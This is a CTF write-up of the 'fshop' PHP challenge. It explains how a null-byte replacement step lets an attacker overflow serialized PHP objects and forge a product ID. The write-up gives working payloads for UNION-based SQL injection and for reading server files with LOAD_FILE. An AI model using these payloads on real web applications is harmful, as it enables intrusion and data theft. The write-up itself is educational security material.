# fshop writeup

16 solves

I believe that this challenge would've had way more less solves without the unintended solution.

Before I start, sorry for not having the pictures of the actual application. The server of the challenge is currently not active.

# Flow of the application

The challenge was written in php and the following 2 files were the ones needed to understand to solve the challenge
```
buy.php
items.php
```

buy.php
```
$stmt=$conn->prepare("SELECT * FROM products where id=?");
$stmt->bind_param("s",$id);
$id=$product_id;
$stmt->execute();
if ($stmt->get_result()->num_rows==0){
	die("Product does not exist");
}
$productOBJ=new Order($product_id,$quantity,$size);

$serialized_product=serialize($productOBJ);

$filtered_serialized_product=str_replace(chr(0).'*'.chr(0), '\0\0\0', $serialized_product);

$sql="INSERT INTO user_items (user_id,product_object) VALUES (?, ?)";
$stmt = $conn->prepare($sql);
$stmt->bind_param("is",$id, $object);
$id=(int)$user_id;
$object=$filtered_serialized_product;
$stmt->execute();
```

buy.php gets the $pdocut_id, $quantity, and $size (This is user-controllable) and serializes it.

When php serializes private properties, it prepends * surrounded with null bytes in the name. 

mysql cannot process null bytes so the code replaces the * surrounded with the null bytes with \0\0\0. Then it just simply executes the sql query and puts the serialized string into a table named user_items.

itmes.php
```
    $sql="SELECT * from user_items where user_id=?";
    $stmt=$conn->prepare($sql);
    $stmt->bind_param("i",$id);
    $id=(int)$_SESSION['id'];
    $stmt->execute();
    echo '<div class="row" id="product-list">';
    if ($result = $stmt->get_result()) {
        while ($row = $result -> fetch_row()) {
            $serializedObject=$row[2];
            $serializedObject=str_replace('\0\0\0',chr(0).'*'.chr(0), $serializedObject);
            $order=unserialize($serializedObject);
            $prod_id=$order->_product_id;
            $sql2="select * from products where id='$prod_id'";
            if ($result2 = $conn->query($sql2)) {
            
                while ($row2 = $result2 -> fetch_row()) {
                    
                echo "  <div class=\"col-lg-3 col-sm-6 mix all dresses bags\">
                            <div class=\"single-product-item\">
                                <figure>
                                    <a href=\"product-page.php?id=".$row2[0]."\"><img src=".$row2[6].' alt=""></a>
                                    <div class="p-status">For CTF ladies</div>
                                </figure>
                                <div class="product-text">
                                    <h6>'.$row2[1].'</h6>
                                    <p>'.$row2[2].'</p>
                                </div>
                            </div>
                        </div>';

                }
                $result2 -> free_result();
            }
        }
        $result -> free_result();
    }
```

Items.php showed all of the items that you have chose in buy.php.

It first get's all of the rows from user_items with your user_id.
It then gets the serialized object that was made from buy.php and replaces \0\0\0 with * surrounded with null bytes and unserialises that then print them out.

# vulnerability

The problem with this program is that the user also has the ability to inject \0.

Below is an example of a serialized object.
```
{s:12:"*_quantity";s:1:"1";s:8:"*_size";s:1:"S";s:11:"_product_id";s:1:"1";}
```

As I said, since mysql can't process null bytes, the application will change it to

```
{s:12:"\0\0\0_quantity";s:1:"1";s:8:"\0\0\0_size";s:1:"S";s:11:"_product_id";s:1:"1";}
```

and then change it back to the original serialized object by replacing \0\0\0 with chr(0)."*".chr(0) in items.php.

But what if you give \0 values like the example below?

```
?id=3&size=s&quantity=%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0

results in 

serialized_product : O:5:"Order":3:{s:12:"*_quantity";s:30:"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";s:8:"*_size";s:1:"s";s:11:"_product_id";s:1:"3";}

and then replacing * with \0\0\0 it will change to 

filtered_serialized_product : O:5:"Order":3:{s:12:"\0\0\0_quantity";s:30:"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";s:8:"\0\0\0_size";s:1:"s";s:11:"_product_id";s:1:"3";}
then go into the db
```

and then when it converts \0\0\0 back to \* in items.php it will change to 

```
serializedObject : O:5:"Order":3:{s:12:"*_quantity";s:30:"*****";s:8:"*_size";s:1:"s";s:11:"_product_id";s:1:"3";}
```

Pay attention to the string length where it says s:30. It gave the value of s:30 because it counts all characters in \0\0\0\0\0\0\0\0\0\0\0\0\0\0\0 but when it converts it back to chr(0)."\*".chr(0) it is still in s:30 but the actual character length is 15(you need to also count the null bytes so 10 null bytes + 5 "\*" is 15). This means that we have 15 more characters that we can control. So when the above serealized object gets unserialized, it will occur an error.

# Exploit

So the attack flow is
1. overflow _quantity and overwrite _size
2. create and put the serialized object that contains _size and _product_id(containing the sql injection) into _size

Let's say we want to inject 'UNION SELECT null,null,null,null,null,null,null-- -

the payload will be the following
```
id=3&size=";s:8:"\0\0\0_size";s:5:"12345";s:11:"_product_id";s:156:"UNION SELECT null,null,null,null,null,null,null-- -&quantity=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
```

when this payload gets serialized and when the \0s get replaced with * it will look like below
```
O:5:"Order":3:{s:12:"*_quantity";s:48:"********";s:8:"*_size";s:109:"";s:8:"*_size";s:5:"12345";s:11:"_product_id";s:79:"'UNION SELECT null,null,null,null,null,null,null-- -";s:11:"_product_id";s:1:"3";}
```
so at _quantity, the character length is stated 48 so it will cover 
```
********";s:8:"*_size";s:109:"
```
as string. So when it gets unserialized, it unserializes the part that was in the payload which is size=12345 and _product_id='UNION SELECT null,null,null,null,null,null,null-- -

Perfect! so now we can control the _product_id and achieve sql injection in /items.php

Unfortunately, I do not remember the exact query that I have used so below is the author's sql injection query.

```
id=3&size=";s:8:"\0\0\0_size";s:5:"12345";s:11:"_product_id";s:156:"50' union select 1,2,VARIABLE_VALUE,4,5,6,7 from performance_schema.session_variables where VARIABLE_NAME="secure_file_priv";-- -&quantity=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0


/var/lib/Fword/mysql-files/You_got_it/


id=3&size=";s:8:"\0\0\0_size";s:5:"12345";s:11:"_product_id";s:120:"50' union select 1,2,LOAD_FILE("/var/lib/Fword/mysql-files/You_got_it/flag.txt"),4,5,6,7;-- -&quantity=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0

FwordCTF{Uns3ri4lize_ov3rfl0w_fi7s_be7t3r_w1th_s0m3_5QL_1nj3c7ion}
```
The above payload uses the same idea that I explained.

Thanks for reading



# Unintended Solution

There was a bug in /items.php where if you went to /items.php before logging in, it will give you other user's output which also printed out the flag. I right away reported it to admin and it got fixed after some time.

# Conclsion
This was a fun challenge about serializing. Sorry for the bad writeup, I'm currently on some assignemtns for school so I had to write it quick and short.

Once again, thanks for reading.